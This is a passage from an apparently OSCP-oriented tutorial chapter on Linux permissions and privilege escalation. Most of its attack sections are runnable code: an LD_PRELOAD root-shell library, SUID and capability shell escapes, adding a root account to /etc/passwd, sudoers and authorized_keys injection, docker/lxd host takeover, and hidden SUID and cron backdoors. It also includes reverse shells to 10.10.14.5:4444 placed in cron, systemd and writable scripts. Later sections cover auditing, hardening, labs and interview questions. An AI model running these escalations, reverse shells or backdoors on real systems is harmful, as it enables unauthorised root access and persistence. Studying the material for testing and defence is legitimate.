find / -perm -4000 -type f 2>/dev/null

# Check what libraries they load
strace /usr/local/bin/suid_binary 2>&1 | grep -i open

# Look for missing libraries or libraries in writable paths
```

**Example exploit**:
```c
// evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

Compile and inject:
```bash
gcc -shared -fPIC -o /tmp/evil.so evil.c
export LD_PRELOAD=/tmp/evil.so
/usr/local/bin/suid_binary
# Root shell!
```

---

## 10. GTFOBins - The SUID Exploit Database

### 10.1 What Is GTFOBins?

**GTFOBins** (https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited for:
- Privilege escalation (SUID)
- Breaking out of restricted shells
- Bypassing file read restrictions
- Reverse shells
- File uploads/downloads

**Think of it as**: The "exploit database" for common Linux utilities.

### 10.2 How to Use GTFOBins

1. **Find SUID binary**: `find / -perm -4000 2>/dev/null`
2. **Search GTFOBins**: Visit https://gtfobins.github.io
3. **Filter by SUID**: Click the "SUID" tag
4. **Find your binary**: Search for the binary name
5. **Copy exploit**: Follow the instructions

### 10.3 Common GTFOBins Exploits

#### vim (SUID)

```bash
./vim -c ':!/bin/sh'
# or
./vim
:set shell=/bin/sh
:shell
```

#### less (SUID)

```bash
./less /etc/profile
!/bin/sh
```

#### more (SUID)

```bash
./more /etc/profile
!/bin/sh
```

#### nano (SUID)

```bash
./nano
^R (Ctrl+R to read file)
^X (Ctrl+X to execute command)
reset; sh 1>&0 2>&0
```

#### awk (SUID)

```bash
./awk 'BEGIN {system("/bin/sh")}'
```

#### perl (SUID)

```bash
./perl -e 'exec "/bin/sh";'
```

#### python (SUID)

```bash
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

#### ruby (SUID)

```bash
./ruby -e 'exec "/bin/sh"'
```

#### nmap (SUID) - Older Versions

```bash
# nmap < 5.20 had interactive mode
./nmap --interactive
nmap> !sh
```

#### find (SUID)

```bash
./find . -exec /bin/sh -p \; -quit
```

#### tar (SUID)

```bash
./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### git (SUID)

```bash
./git help config
!/bin/sh
```

#### zip (SUID)

```bash
./zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

### 10.4 GTFOBins Automation Script

```bash
#!/bin/bash
# gtfo_checker.sh - Check SUID binaries against GTFOBins

echo "[*] Finding SUID binaries..."
SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null)

# GTFOBins SUID list (partial)
GTFO_LIST="vim vi nano less more cp mv find awk perl python python3 ruby php lua bash sh dash ash zsh nmap tar zip unzip git ftp socat wget curl nc netcat ssh scp rsync"

echo "[!] Checking against GTFOBins database..."
for binary in $SUID_BINS; do
    basename=$(basename $binary)
    if echo "$GTFO_LIST" | grep -q -w "$basename"; then
        echo "[+] FOUND: $binary"
        echo "    → Check: https://gtfobins.github.io/gtfobins/$basename/#suid"
    fi
done
```

Usage:
```bash
chmod +x gtfo_checker.sh
./gtfo_checker.sh
```

---

## 11. Capability-Based Privilege Escalation

### 11.1 Dangerous Capabilities

Certain capabilities are essentially root:

#### CAP_SETUID - The Ultimate Privilege Escalation

Allows changing process UID to any value (including 0/root).

**Example**:
```bash
# Find binaries with cap_setuid
getcap -r / 2>/dev/null | grep cap_setuid

# Suppose /usr/bin/python3.8 has cap_setuid
# /usr/bin/python3.8 = cap_setuid+ep

# Exploit
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

whoami
# root
```

#### CAP_DAC_OVERRIDE - Bypass All Permissions

Allows reading/writing any file regardless of permissions.

**Example with perl**:
```bash
# Find binaries with cap_dac_override
getcap -r / 2>/dev/null | grep cap_dac_override

# Suppose /usr/bin/perl has cap_dac_override
# Exploit: Read /etc/shadow
perl -e 'open(F, "/etc/shadow"); print <F>'

# Or: Write to /etc/passwd
perl -e 'system("echo hacker:password:0:0::/root:/bin/bash >> /etc/passwd")'
```

#### CAP_SYS_ADMIN - The God Capability

Can do almost anything: mount filesystems, debug processes, load BPF programs, etc.

**Example: Mount Attack**:
```bash
# Find binaries with cap_sys_admin
getcap -r / 2>/dev/null | grep cap_sys_admin

# You can mount arbitrary filesystems
# Create a malicious filesystem image with SUID binaries
# Mount it and execute
```

#### CAP_DAC_READ_SEARCH - Read Any File

```bash
# Exploit with tar
getcap /usr/bin/tar
# cap_dac_read_search+ep

# Read /etc/shadow
tar -cvf shadow.tar /etc/shadow 2>/dev/null
tar -xvf shadow.tar
cat etc/shadow
```

### 11.2 Capability Exploitation Examples

#### Python with CAP_SETUID

```python
#!/usr/bin/env python3
import os

# Set UID to 0 (root)
os.setuid(0)

# Spawn root shell
os.system("/bin/bash")
```

```bash
# Set capability
sudo setcap cap_setuid+ep /usr/bin/python3

# Run exploit
python3 exploit.py
whoami
# root
```

#### Perl with CAP_DAC_OVERRIDE

```bash
# Perl can now read any file
perl -e 'open(F, "/etc/shadow"); print <F>'

# Or create SUID bash
perl -e 'system("cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash")'
/tmp/rootbash -p
```

#### Ruby with CAP_SETUID

```ruby
# Set UID to root
Process::Sys.setuid(0)

# Spawn shell
system("/bin/bash")
```

### 11.3 Capability Enumeration

```bash
#!/bin/bash
# cap_enum.sh - Enumerate capabilities

echo "[*] Searching for files with capabilities..."
getcap -r / 2>/dev/null

echo -e "\n[*] Searching for DANGEROUS capabilities..."
getcap -r / 2>/dev/null | grep -E "cap_setuid|cap_setgid|cap_dac_override|cap_dac_read_search|cap_sys_admin"

echo -e "\n[*] Current process capabilities..."
cat /proc/self/status | grep Cap

echo -e "\n[*] Detailed capability breakdown..."
getpcaps $$
```

---

## 12. Permission Enumeration Techniques

### 12.1 The OSCP Enumeration Checklist

When you land on a box, run these commands:

```bash
# 1. Who am I?
whoami
id

# 2. What groups am I in? (docker, lxd, sudo = jackpot)
groups

# 3. What can I run as sudo?
sudo -l

# 4. Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# 5. Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# 6. Find world-writable files
find / -perm -2 -type f 2>/dev/null

# 7. Find world-writable directories
find / -perm -2 -type d 2>/dev/null

# 8. Find files with capabilities
getcap -r / 2>/dev/null

# 9. Find writable files in /etc
find /etc -writable -type f 2>/dev/null

# 10. Check for NFS shares with no_root_squash
cat /etc/exports
```

### 12.2 Automated Enumeration Scripts

#### LinPEAS

```bash
# Download
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Or use curl
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Run
chmod +x linpeas.sh
./linpeas.sh

# Save output
./linpeas.sh | tee linpeas_output.txt
```

#### LinEnum

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

#### linux-smart-enumeration (lse.sh)

```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh -l 1  # Level 1 (basic)
./lse.sh -l 2  # Level 2 (detailed)
```

### 12.3 Manual Interesting File Search

```bash
# Find SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Find config files with passwords
grep -r "password" /etc/ 2>/dev/null
grep -r "passwd" /etc/ 2>/dev/null

# Find database files
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null

# Find backup files
find / -name "*.bak" 2>/dev/null
find / -name "*backup*" 2>/dev/null
find / -name "*.old" 2>/dev/null

# Find history files
cat ~/.bash_history
cat ~/.mysql_history
find / -name ".bash_history" 2>/dev/null
```

### 12.4 Monitoring File System Changes

**Scenario**: You want to see what files get created/modified when a cron job runs.

```bash
# Monitor /tmp for new files
watch -n 1 'ls -lat /tmp | head'

# Monitor /etc for changes
find /etc -type f -printf '%T@ %p\n' | sort -n | tail -20

# Use inotify to watch directory
inotifywait -m -r -e create,modify /var/log/
```

---

## 13. Writable Files and Directories

### 13.1 Why Writable Locations Matter

If you can write to certain files or directories, you might be able to:
- Modify scripts run by root
- Place malicious libraries in library paths
- Inject code into configuration files
- Create cronjobs
- Modify service definitions

### 13.2 Critical Writable Files

#### /etc/passwd - Root Account Addition

If `/etc/passwd` is writable:

```bash
# Generate password hash
openssl passwd -1 -salt evil password123
# $1$evil$8Jx0sNcPxaRBSLQHj54gk/

# Add root user
echo 'hacker:$1$evil$8Jx0sNcPxaRBSLQHj54gk/:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su hacker
Password: password123

whoami
# root
```

#### /etc/shadow - Direct Hash Replacement

If `/etc/shadow` is readable AND `/etc/passwd` is writable, you can replace root's password hash.

#### /etc/sudoers - Sudo Access

If `/etc/sudoers` is writable:

```bash
echo "yourusername ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo su
# root!
```

#### ~/.ssh/authorized_keys - SSH Access

If you can write to a user's `~/.ssh/authorized_keys`:

```bash
# Generate SSH key
ssh-keygen -f /tmp/exploit

# Copy public key to target
echo "$(cat /tmp/exploit.pub)" >> /home/victim/.ssh/authorized_keys

# SSH in
ssh -i /tmp/exploit victim@target
```

### 13.3 Writable Directories for Code Execution

#### /etc/cron.d/ - Cron Job Injection

```bash
# Create malicious cron job
cat > /etc/cron.d/root_shell << 'EOF'
* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
EOF

# Wait for cron to run (max 1 minute)
# Listen on attacker machine:
nc -lvnp 4444
```

#### /etc/systemd/system/ - Systemd Service

```bash
# Create malicious service
cat > /etc/systemd/system/root.service << 'EOF'
[Unit]
Description=Root Shell Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl enable root.service
systemctl start root.service
```

#### Library Path Hijacking

If a program loads libraries from a writable directory:

```bash
# Check library paths
ldconfig -v 2>/dev/null | grep -v ^$'\t'

# If /tmp or /home/user is in the path, you can inject a malicious library
```

---

## 14. The Docker/LXD Group Privilege Escalation

### 14.1 Why Docker Group = Root

Being in the `docker` group allows you to:
1. Run containers
2. Mount the host filesystem into a container
3. Access the mounted filesystem **as root inside the container**
4. But the host filesystem is the REAL filesystem!

**Result**: You can read/modify ANY file on the host as if you were root.

### 14.2 Docker Group Exploitation

```bash
# Check if you're in docker group
id
# uid=1000(john) gid=1000(john) groups=1000(john),999(docker)

# Method 1: Mount host root filesystem
docker run -v /:/mnt -it alpine

# Inside container (you're root)
whoami
# root

cd /mnt
ls
# bin  boot  dev  etc  home  lib  ...

# You can now read/modify HOST files
cat /mnt/etc/shadow
# Read the real /etc/shadow!

# Add SSH key to root
mkdir -p /mnt/root/.ssh
echo "YOUR_SSH_PUBLIC_KEY" >> /mnt/root/.ssh/authorized_keys

# Exit container, SSH as root
exit
ssh root@target
# YOU ARE ROOT!
```

**Method 2: Create SUID bash**
```bash
docker run -v /:/mnt -it alpine
chroot /mnt
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
exit

# On host
/tmp/rootbash -p
whoami
# root
```

### 14.3 LXD Group Exploitation

Similar to docker:

```bash
# Check if in lxd group
id

# Build Alpine container image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine

# Transfer to target (alpine-vX.X-x86_64.tar.gz)

# Import and run
lxc image import ./alpine-vX.X-x86_64.tar.gz --alias exploit
lxc init exploit privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# Inside container
cd /mnt/root
# You have root access to host filesystem
```

---

## 15. World-Writable Files and Security Risks

### 15.1 Finding World-Writable Files

```bash
# Find all world-writable files
find / -perm -2 -type f 2>/dev/null

# Exclude /proc and /sys
find / -path /proc -prune -o -path /sys -prune -o -perm -2 -type f 2>/dev/null

# Find world-writable directories
find / -perm -2 -type d 2>/dev/null
```

### 15.2 Dangerous World-Writable Scenarios

#### Scripts Run by Cron

```bash
# Find scripts in cron
cat /etc/crontab
ls -la /etc/cron.*

# If a script is world-writable and run by root
ls -l /opt/backup.sh
# -rwxrwxrwx 1 root root 100 Jan 24 /opt/backup.sh

# Inject reverse shell
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/backup.sh

# Wait for cron
nc -lvnp 4444
# Root shell!
```

#### Scripts in $PATH

```bash
# Check PATH
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# If a directory in PATH is writable
ls -ld /usr/local/bin
# drwxrwxrwx 2 root root 4096 Jan 24 /usr/local/bin

# Create malicious command
cat > /usr/local/bin/ls << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /usr/local/bin/ls

# Wait for admin to run "ls"
# You get a root shell
```

---

## 16. Permission Persistence Techniques

### 16.1 SUID Backdoor

```bash
# As root, create persistent SUID backdoor
cp /bin/bash /var/tmp/.hidden
chmod 4755 /var/tmp/.hidden

# Hidden in unusual location
# As attacker, return later:
/var/tmp/.hidden -p
whoami
# root
```

### 16.2 Capability Backdoor

```bash
# As root, give capabilities to a binary
setcap cap_setuid+ep /usr/bin/python3.8

# As attacker:
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 16.3 Writable /etc/passwd Persistence

```bash
# Add backdoor user
echo 'backdoor:$1$evil$8Jx0sNcPxaRBSLQHj54gk/:0:0::/root:/bin/bash' >> /etc/passwd

# Can login anytime
su backdoor
```

### 16.4 Cron Job Persistence

```bash
# Add cronjob that creates SUID shell daily
echo '0 3 * * * root cp /bin/bash /tmp/.rootshell && chmod 4755 /tmp/.rootshell' >> /etc/crontab
```

---

## 17. Blue Team: Auditing and Defense

### 17.1 Regular SUID Audits

```bash
#!/bin/bash
# suid_audit.sh - Baseline and monitor SUID binaries

BASELINE="/root/suid_baseline.txt"
CURRENT="/tmp/suid_current.txt"

# Create baseline (first run)
if [ ! -f "$BASELINE" ]; then
    find / -perm -4000 -type f 2>/dev/null > "$BASELINE"
    echo "[*] Baseline created at $BASELINE"
    exit 0
fi

# Current scan
find / -perm -4000 -type f 2>/dev/null > "$CURRENT"

# Compare
echo "[*] Checking for new SUID binaries..."
diff "$BASELINE" "$CURRENT"

# Alert on changes
if [ $? -ne 0 ]; then
    echo "[!] WARNING: SUID binaries have changed!"
    echo "[!] Investigate immediately!"
fi
```

Run daily via cron.

### 17.2 Capability Monitoring

```bash
#!/bin/bash
# Monitor capabilities

echo "[*] Files with capabilities:"
getcap -r / 2>/dev/null

echo -e "\n[!] DANGEROUS capabilities found:"
getcap -r / 2>/dev/null | grep -E "cap_setuid|cap_setgid|cap_sys_admin|cap_dac_override"
```

### 17.3 Filesystem Hardening

#### Mount Options

```bash
# /etc/fstab
# Prevent SUID execution on /home and /tmp
/dev/sda1  /home  ext4  defaults,nosuid,nodev  0  2
tmpfs      /tmp   tmpfs defaults,nosuid,nodev,noexec  0  0
```

**Mount options**:
- `nosuid`: Ignore SUID/SGID bits
- `nodev`: No device files
- `noexec`: No execution
- `ro`: Read-only

#### ACL Monitoring

```bash
# Find all files with ACLs
find / -type f -exec getfacl {} \; 2>/dev/null | grep -B1 "^user:"
```

### 17.4 Secure Default Umask

```bash
# /etc/profile or /etc/bash.bashrc
umask 0027  # Files: 640, Dirs: 750
```

### 17.5 File Integrity Monitoring

**AIDE (Advanced Intrusion Detection Environment)**

```bash
apt install aide

# Initialize database
aideinit

# Check for changes
aide --check
```

---

## 18. Common Permission Misconfigurations

### 18.1 Overly Permissive Sudoers

```bash
# BAD: User can run anything as root
john ALL=(ALL) NOPASSWD: ALL

# BAD: User can run any command in /usr/bin
john ALL=(ALL) NOPASSWD: /usr/bin/*

# Exploitation
sudo /usr/bin/vim /etc/shadow
# or
sudo /usr/bin/python -c 'import os; os.system("/bin/bash")'
```

### 18.2 World-Writable Config Files

```bash
# Find world-writable configs
find /etc -perm -2 -type f 2>/dev/null

# Common mistakes:
# -rw-rw-rw- /etc/cron.d/backup
# -rw-rw-rw- /etc/passwd (CRITICAL!)
# -rw-rw-rw- /etc/systemd/system/web.service
```

### 18.3 Executable Shared Libraries

```bash
# Writable library paths
ldconfig -v 2>/dev/null | grep -v ^$'\t'

# If /tmp is in there:
# -rwxrwxrwx /etc/ld.so.conf.d/tmp.conf
# DANGEROUS!
```

### 18.4 Insecure Group Memberships

```bash
# Privileged groups that should be audited:
# - docker: Root access via containers
# - lxd: Root access via containers
# - disk: Direct disk access
# - sudo: Can run sudo
# - admin: Administrative functions
# - wheel: Can su to root (some distros)
```

Audit:
```bash
# Check who's in docker group
grep docker /etc/group

# Should only be trusted users!
```

---

## 19. Hands-On Labs

### Lab 1: Basic Permission Modification

**Objective**: Create files with different permissions and test access.

```bash
# Create test directory
mkdir ~/permlab
cd ~/permlab

# Create files with different permissions
touch file1 file2 file3 file4

chmod 000 file1  # No access
chmod 400 file2  # Read-only owner
chmod 644 file3  # Standard file
chmod 755 file4  # Executable

# Test reading
cat file1  # Permission denied
cat file2  # Works
cat file3  # Works

# Test writing
echo "test" >> file1  # Permission denied
echo "test" >> file2  # Permission denied
echo "test" >> file3  # Works

# Test execute
./file4  # Will try to execute (may fail if not actually executable code)

# Create directories with different permissions
mkdir dir1 dir2 dir3
chmod 000 dir1
chmod 500 dir2
chmod 755 dir3

# Test access
cd dir1  # Permission denied
cd dir2  # Works
ls dir2  # Permission denied (no read!)
cd dir3  # Works
ls dir3  # Works
```

### Lab 2: SUID Exploitation Simulation

**Objective**: Create and exploit a SUID binary in a safe environment.

```bash
# As root (use sudo or VM)
sudo su

# Create a vulnerable SUID program
cat > /tmp/vuln.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <command>\n", argv[0]);
        return 1;
    }
    
    // VULNERABILITY: No input sanitization!
    system(argv[1]);
    return 0;
}
EOF

# Compile
gcc /tmp/vuln.c -o /usr/local/bin/vuln

# Set SUID
chmod 4755 /usr/local/bin/vuln

ls -l /usr/local/bin/vuln
# -rwsr-xr-x 1 root root ...

exit  # Back to regular user

# EXPLOIT
/usr/local/bin/vuln "/bin/bash"

whoami
# root

# Clean up
exit
sudo rm /usr/local/bin/vuln
```

### Lab 3: ACL Fine-Grained Control

**Objective**: Use ACLs to grant specific users different permissions.

```bash
# Create test file
echo "Secret data" > /tmp/acl_test.txt
chmod 600 /tmp/acl_test.txt

# Standard permissions: only owner can read
ls -l /tmp/acl_test.txt
# -rw------- 1 alice alice 12 Jan 24 /tmp/acl_test.txt

# Grant bob read access via ACL
setfacl -m u:bob:r /tmp/acl_test.txt

# Grant charlie read+write via ACL
setfacl -m u:charlie:rw /tmp/acl_test.txt

# Verify
getfacl /tmp/acl_test.txt
# user::rw-
# user:bob:r--
# user:charlie:rw-
# group::---
# mask::rw-
# other::---

ls -l /tmp/acl_test.txt
# -rw-rw----+ 1 alice alice 12 Jan 24 /tmp/acl_test.txt
#           ^
#           └─ Plus sign indicates ACLs

# Test as bob
su - bob
cat /tmp/acl_test.txt  # Works
echo "test" >> /tmp/acl_test.txt  # Permission denied

# Test as charlie
su - charlie
cat /tmp/acl_test.txt  # Works
echo "test" >> /tmp/acl_test.txt  # Works!
```

### Lab 4: Capability Privilege Escalation

**Objective**: Exploit a binary with dangerous capabilities.

```bash
# As root
sudo su

# Give python3 the cap_setuid capability
setcap cap_setuid+ep /usr/bin/python3

# Verify
getcap /usr/bin/python3
# /usr/bin/python3 = cap_setuid+ep

exit  # Regular user

# EXPLOIT
python3 << 'EOF'
import os
os.setuid(0)  # Set UID to root
os.system("/bin/bash")
EOF

whoami
# root

# Clean up
exit
sudo setcap -r /usr/bin/python3
```

### Lab 5: Finding and Exploiting SUID Binaries

**Objective**: Use enumeration to find privilege escalation paths.

```bash
# Run enumeration
find / -perm -4000 -type f 2>/dev/null > suid_list.txt

# Review the list
cat suid_list.txt

# Look for unusual binaries
# Standard ones: /usr/bin/passwd, /usr/bin/sudo, /bin/su

# Check each suspicious binary against GTFOBins
# Example: find is SUID

ls -l /usr/bin/find
# -rwsr-xr-x 1 root root ...

# Exploit
find . -exec /bin/sh -p \; -quit

whoami
# root
```

---

## 20. Interview Questions and Answers

### Q1: What is the difference between SUID and sudo?

**Answer**:
- **SUID**: A permission bit set on a binary. ANY user who executes it will run it with the owner's privileges. Example: `/usr/bin/passwd` is SUID root, so anyone can run it and it executes as root to modify `/etc/shadow`.
- **sudo**: A program that allows specific users (configured in `/etc/sudoers`) to run specific commands as another user (usually root). It requires authentication (password) and logs actions.

**Key difference**: SUID is automatic and applies to anyone; sudo is controlled and requires configuration.

---

### Q2: Explain the difference between these permissions: 755, 644, 600

**Answer**:
- **755** (rwxr-xr-x): Owner can read/write/execute, group and others can read/execute. Used for **executable binaries and directories**.
- **644** (rw-r--r--): Owner can read/write, group and others can read only. Used for **regular files** (text files, configs).
- **600** (rw-------): Only owner can read/write, no one else can access. Used for **private files** (SSH keys, password files).

---

### Q3: How would you find all files owned by a specific user?

**Answer**:
```bash
find / -user alice -type f 2>/dev/null

# Or by UID
find / -uid 1000 -type f 2>/dev/null
```

---

### Q4: What is the sticky bit and where is it commonly used?

**Answer**:
The sticky bit (octal 1000, symbolic +t) is set on directories to prevent users from deleting files they don't own, even if the directory is world-writable.

**Common use**: `/tmp` directory
```bash
ls -ld /tmp
drwxrwxrwt 20 root root 4096 Jan 24 /tmp
```

Anyone can create files in `/tmp`, but only the file owner (or root) can delete them.

---

### Q5: You see a file with permissions "-rwsr-xr-x". What does the 's' mean?

**Answer**:
The 's' in the owner's execute position means the **SUID bit** is set. When this file is executed, it runs with the **owner's UID** instead of the user who ran it.

If the owner is root, this is a potential **privilege escalation vector** if the binary is vulnerable.

---

### Q6: How do Linux capabilities improve security compared to SUID?

**Answer**:
SUID gives a process ALL of root's privileges (UID 0). Capabilities break root's power into granular privileges:
- `cap_net_bind_service`: Only bind ports < 1024
- `cap_net_raw`: Only create raw sockets
- `cap_setuid`: Only change UID

This follows the **Principle of Least Privilege** - a web server only needs to bind port 80, not format hard drives or read all files.

**Example**: Instead of making Apache SUID root, you give it `cap_net_bind_service`:
```bash
setcap cap_net_bind_service+ep /usr/sbin/apache2
```

---

### Q7: What's the difference between "chmod 644 file" and "chmod a=r,u+w file"?

**Answer**:
They achieve the same result (rw-r--r--) but use different notations:
- **Octal (644)**: Sets absolute permissions (6=rw for owner, 4=r for group, 4=r for other)
- **Symbolic (a=r,u+w)**: Sets permissions relative to current state (all=read, user+write)

Octal is faster and more precise; symbolic is more readable for complex changes.

---

### Q8: You're in the docker group. How can you escalate to root?

**Answer**:
```bash
docker run -v /:/mnt -it alpine
# Inside container:
chroot /mnt
# Now you have root access to the HOST filesystem
```

Being in the docker group = root, because you can mount the host filesystem into a container where you're root.

---

### Q9: How would you create a file that only root can read, but anyone can execute?

**Answer**:
```bash
# Create file
touch script.sh

# Set permissions: owner r-x, others only execute
chmod 500 script.sh
chown root:root script.sh

ls -l script.sh
# -r-x------ 1 root root 0 Jan 24 script.sh

# Wait, this doesn't work! Only root can execute too.

# CORRECT ANSWER: You CANNOT do this with standard permissions.
# To execute, you need read access (to load the file into memory).
# The closest is: r-xr-xr-x (everyone can read and execute)
chmod 555 script.sh
```

**Trick question**: You can't give execute without read (file needs to be read to execute).

---

### Q10: What's the output of "umask 0022" and how does it affect new files?

**Answer**:
- **umask 0022**: Sets the permission mask to 022
- **New files**: Default 666 - 022 = **644** (rw-r--r--)
- **New directories**: Default 777 - 022 = **755** (rwxr-xr-x)

**Effect**: Owner can read/write, group and others can only read. This is the standard secure default.

---

## 21. Summary and Next Steps

### 21.1 What We Covered

You've learned:
- ✅ The UGO (User, Group, Other) permission model
- ✅ Octal vs symbolic notation (755, rwxr-xr-x)
- ✅ Special permissions: SUID, SGID, Sticky Bit
- ✅ Access Control Lists (ACLs) for fine-grained control
- ✅ Linux Capabilities to break root power into slices
- ✅ Umask for default permission control
- ✅ **SUID binary exploitation** - the #1 privilege escalation technique
- ✅ GTFOBins database for exploitation
- ✅ Capability-based privilege escalation
- ✅ Permission enumeration methodology
- ✅ Writable files and directories exploitation
- ✅ Docker/LXD group privilege escalation
- ✅ Blue team defense and auditing
- ✅ 20+ working examples and hands-on labs

### 21.2 Critical Takeaways for OSCP

**Privilege Escalation Workflow**:
1. **Enumerate**: `id`, `sudo -l`, find SUID/SGID, getcap
2. **Identify**: Compare against GTFOBins, check group memberships
3. **Exploit**: SUID binary, capability, docker group, writable files
4. **Get Root**: `whoami` → root

**Most Common Vectors**:
- SUID binaries (vim, find, bash, python with SUID)
- Sudo misconfigurations (NOPASSWD, wildcards)
- Docker/LXD group membership
- Writable /etc/passwd or cron files
- Capabilities (cap_setuid, cap_dac_override)

### 21.3 Practical Commands to Memorize

```bash
# Enumeration
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2 -type f 2>/dev/null     # World-writable
getcap -r / 2>/dev/null                  # Capabilities
id                                       # Check groups

# Exploitation
find . -exec /bin/sh -p \; -quit         # SUID find
vim -c ':!/bin/sh'                       # SUID vim
docker run -v /:/mnt -it alpine          # Docker group
python -c 'import os; os.setuid(0); os.system("/bin/sh")'  # cap_setuid

# Defense
chmod 755 directory                      # Secure directory
chmod 644 file                           # Secure file
setfacl -b file                          # Remove ACLs
mount -o remount,nosuid /home            # Disable SUID
```

### 21.4 Next Steps

**Practice**:
- Set up a VM (Ubuntu/Debian)
- Create SUID binaries and exploit them
- Try all GTFOBins examples
- Run LinPEAS on HackTheBox/TryHackMe machines

**Further Reading**:
- GTFOBins: https://gtfobins.github.io
- Linux Privilege Escalation Guide: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- PEASS-ng (LinPEAS): https://github.com/carlospolop/PEASS-ng

**Next Chapter**: File 05 - Linux Services & Common Vulnerabilities

---

**You now have a comprehensive understanding of Linux permissions from basic concepts to advanced exploitation techniques. Master this chapter, and privilege escalation in OSCP will become second nature.**

---
*End of Chapter 04 - Permissions & Capabilities*
